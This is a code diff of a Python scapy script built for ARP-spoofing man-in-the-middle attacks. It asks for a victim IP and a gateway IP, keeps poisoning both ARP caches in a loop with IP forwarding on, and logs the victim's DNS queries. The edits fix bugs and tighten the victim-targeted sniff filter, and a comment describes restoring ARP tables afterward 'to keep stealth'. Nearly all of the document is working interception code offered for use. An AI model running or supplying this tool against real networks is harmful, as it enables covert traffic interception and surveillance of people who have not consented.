@@ -22,11 +22,16 @@ from scapy.all import *
 
 print "[!] MAKE SURE YOU ARE RUNNING AS ROOT"
 
+# for dev and testing purposes
+#interface = "wlp0s20u9u2"
+#victimIP = "192.168.1.114"
+#gatewayIP = "192.168.1.1"
 
 try:
 	interface = raw_input("[*] Enter the Arping and Sniffing Interface: ")
 	victimIP = raw_input("[*] Enter the Victim's IP Address: ")
 	gatewayIP = raw_input("[*] Enter the Gateway Router's IP Address: ")
+#    pass
 except KeyboardInterrupt: # in case of ctrl C: SIGINT
 	print "\n[!] User Requested Shutdown"
 	print "[!] Exiting....." 
@@ -48,22 +53,24 @@ def getMac(IP):
 	# to ask for the hardware address for the specified input IP
 	# also we should turn off verbose from scapy
 	conf.verb = 0
-		# using the send and recieve layer 2 function, arp request has a timeout of 2 seconds
+		# using the send and recieve layer 2 function,has a timeout of 10 seconds which should be plenty for a LAN
 			# interval of request is every 0.1 seconds
-	(ans, unans) = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=IP, timeout=2, iface=interface, inter=0.1))
-	print unans
-	print ans
-	for (send, recieve) in ans:  # source would be the hardware that responded to that IP
-		return recieve.sprint(r"%Ether.src%")
+        request_packet = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=IP)
+        reply = srp1(request_packet, timeout=10, iface=interface, inter=0.1)
+        # reply will be the only answered packet, and it only has the response data
+
+        if reply.haslayer(ARP): # this is to confirm that the response packet has a ARP layer, which it should
+            return reply.getlayer(Ether).src # if it does, we will grab its hardware source for MAC requested
 
 # defining the re arp function, for victim and gateway to reunite again
 def reArp():
 	print "\n[!] Restoring Targets........"
 	# first we need to grab each of the MAC addresses then using the layer 3 send function to send a arp with correct values
-	VictimMAC = getMac(VictimIP)
+	VictimMAC = getMac(victimIP)
 	GatewayMAC = getMac(gatewayIP)
-	send(ARP(op=2, pdst=victimIP, psrc=gatewayIP, hwdst=VictimMAC, hwsrc=GatewayMAC, count=7)) # sending this 7 times
-	print "[!] Disabling IP Forward..."
+	send(ARP(op=2, pdst=victimIP, psrc=gatewayIP, hwdst=VictimMAC, hwsrc=GatewayMAC), count=7) # sending this 7 times
+	send(ARP(op=2, pdst=gatewayIP, psrc=victimIP, hwdst=GatewayMAC, hwsrc=VictimMAC), count=7)
+        print "[!] Disabling IP Forward..."
 	os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
 	print "[!] Shutting Down"
 	sys.exit(1)
@@ -71,19 +78,19 @@ def reArp():
 
 # defining the arp spoof function, the function that will be responsible of arp spoofing
 def arpSpoof(victimMac, gatewayMac):
-	# arp spoofing gateway, using level 3 send from scapy, op=2 for reponse, and 1 for query
-	send(ARP(op=2, pdst=victimIP, psrc=gatewayIP, hwdst=victimMac)) # hardware source will be from attacher pc, by scapy default
+        # arp spoofing gateway, using level 3 send from scapy, op=2 for reponse, and 1 for query
+        send(ARP(op=2, pdst=victimIP, psrc=gatewayIP, hwdst=victimMac)) # hardware source will be from attacher pc, by scapy default
 	# arp spoofing victim
-	send(ARP(op=2, pdst=gatewayIP, psrc=victimIP, hwdst=getwayMac))
+	send(ARP(op=2, pdst=gatewayIP, psrc=victimIP, hwdst=gatewayMac))
 
 # defining the dns sniffer handler
-def dnsSniffhandler(pkt): 
+def dnsSniffHandler(pkt): 
 	# filter if the packet is indeed a dns packet
 	# also getting packet DNS layer query resource info, 0 means request packet
 	if pkt.haslayer(DNS) and pkt.getlayer(DNS).qr == 0:
 		# returning a string for sniff function to print out
 		# need to get the DNS layer's query data information, of query name -> website name that victim has searched for
-		return "Victim: " + victimIP + " has searched for: " + pkt.getlayer(DNS).qd.qname
+		return "Victim: " + victimIP + " has a DNS query for: " + pkt.getlayer(DNS).qd.qname
 
 
 # defining the main mitm function
@@ -108,12 +115,13 @@ def mainMITM():
 		os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
 		print "[!] Exiting.........."
 		sys.exit(1)
-	while True: 	# setting up an infinite loop to keep arp spoofing the victim and gateway, 1.5 second interval
+	while True: 	# setting up an infinite loop to keep arp spoofing the victim and gateway, 1 second interval
 		try: 
 			arpSpoof(victimMAC, gatewayMAC)
-			# also lets do a dns sniff, to be outputted using the prn callback, and only need 1 packet per arp spoof loop
-			sniff(iface=interface, filter="udp 53", count=1, prn=dnsSniffHandler)
-			time.sleep(1.5)
+			# also lets do a dns sniff on the victim IP, to be outputted using the prn callback, 
+                        # we should only need about 3 packets, should be enough for per search, then restarting the arp and sniff in 1 sec
+			sniff(iface=interface, filter="src " + victimIP+ " and udp and port 53", count=5, prn=dnsSniffHandler)
+			time.sleep(1)
 		except KeyboardInterrupt: 	# Ctrl C Signal
 	# in case of interrupt signal while running the arp spoof, we need to reArp the devices to keep stealth
 			reArp()
